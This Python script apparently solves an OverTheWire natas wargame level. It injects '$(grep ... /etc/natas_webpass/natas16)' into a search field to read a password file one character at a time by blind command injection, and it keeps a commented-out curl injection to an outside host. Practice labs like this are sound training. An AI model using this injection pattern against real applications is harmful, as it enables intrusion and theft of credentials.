import requests
import datetime
import sys
import re
from string import * 

key  = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
user = 'natas17'
url  = 'natas17.natas.labs.overthewire.org'
payload = {'needle':'anything'}

chars = lowercase + uppercase + digits
# payload = {'needle':'$(curl http://verfriemelt.org)'}


# print re.search('([a-z]+)','12 hallo was geht ')

# sys.exit('quiut')

passlist = list();

while len(passlist) < 32:
    for c in chars:

        print ''.join(passlist), c

        payload.update({'needle': 'anythings$(grep ^'+ ''.join(passlist) + c + ' /etc/natas_webpass/natas16)'})
        req = requests.post('http://' + user +':'+ key +"@"+ url, payload)



        if ( not re.findall( '<pre>\n(.*)\n</pre>', req.text ) ):
            passlist.append(c)


# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))
